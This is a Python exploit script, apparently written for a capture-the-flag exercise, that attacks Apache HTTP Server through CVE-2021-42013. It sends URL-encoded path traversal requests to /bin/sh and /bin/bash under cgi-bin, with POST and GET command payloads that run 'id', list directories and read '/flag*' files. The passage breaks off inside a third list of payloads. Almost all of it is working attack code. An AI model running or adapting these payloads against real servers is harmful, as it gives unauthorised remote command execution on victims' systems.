import requests
import urllib.parse

# Target configuration
target = "http://localhost"
timeout = 10

print("[*] CVE-2021-42013 Apache HTTP Server RCE Exploitation Test")
print(f"[*] Target: {target}\n")

# Path traversal payloads to access shell scripts
paths = [
    "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
    "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash",
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash",
]

# Command payloads to execute
command_payloads = [
    "echo;id;echo;cat /flag*",
    "echo;id;echo;ls -la /",
    "echo;cat /flag*",
    "A=|id;cat /flag*",
    "A=|cat /flag*",
    "A=| id",
    "A=| cat /flag*",
    "A=| ls -la /",
    "echo Content-Type: text/plain; echo; id; cat /flag*",
]

test_count = 0

# Test 1: POST requests with command payloads
print("=" * 80)
print("[TEST 1] POST requests with command payloads in body")
print("=" * 80)

for path in paths:
    for payload in command_payloads:
        test_count += 1
        url = f"{target}{path}"
        
        print(f"\n[Test {test_count}] POST {path}")
        print(f"[Payload] {payload}")
        
        try:
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=timeout,
                allow_redirects=False
            )
            
            print(f"[Status] {response.status_code}")
            print(f"[Length] {len(response.content)} bytes")
            
            if response.headers:
                print(f"[Headers] {dict(response.headers)}")
            
            # Print response body
            if response.text:
                print(f"[Response Body]")
                print(response.text)
                
                # Check for flag pattern
                if "FLAG{" in response.text:
                    print("\n" + "!" * 80)
                    print(f"[!!!] POTENTIAL FLAG FOUND at {path}")
                    print(f"[!!!] Payload: {payload}")
                    print("!" * 80)
            else:
                print("[Response Body] (empty)")
                
        except requests.exceptions.Timeout:
            print(f"[Error] Request timeout")
        except requests.exceptions.ConnectionError as e:
            print(f"[Error] Connection error: {e}")
        except Exception as e:
            print(f"[Error] {e}")

# Test 2: GET requests with query parameters (alternative approach)
print("\n" + "=" * 80)
print("[TEST 2] GET requests with query parameters")
print("=" * 80)

query_payloads = [
    "?id",
    "?cat%20/flag*",
    "?ls%20-la%20/",
]

for path in paths[:2]:  # Test with sh and bash
    for query in query_payloads:
        test_count += 1
        url = f"{target}{path}{query}"
        
        print(f"\n[Test {test_count}] GET {path}{query}")
        
        try:
            response = requests.get(
                url,
                timeout=timeout,
                allow_redirects=False
            )
            
            print(f"[Status] {response.status_code}")
            print(f"[Length] {len(response.content)} bytes")
            
            if response.text:
                print(f"[Response Body]")
                print(response.text)
                
                if "FLAG{" in response.text:
                    print("\n" + "!" * 80)
                    print(f"[!!!] POTENTIAL FLAG FOUND at {path}{query}")
                    print("!" * 80)
            else:
                print("[Response Body] (empty)")
                
        except requests.exceptions.Timeout:
            print(f"[Error] Request timeout")
        except requests.exceptions.ConnectionError as e:
            print(f"[Error] Connection error: {e}")
        except Exception as e:
            print(f"[Error] {e}")

# Test 3: POST with specific CGI environment manipulation
print("\n" + "=" * 80)
print("[TEST 3] POST with CGI script-like payloads")
print("=" * 80)

cgi_payloads = [
    "echo\nid\ncat /flag*",
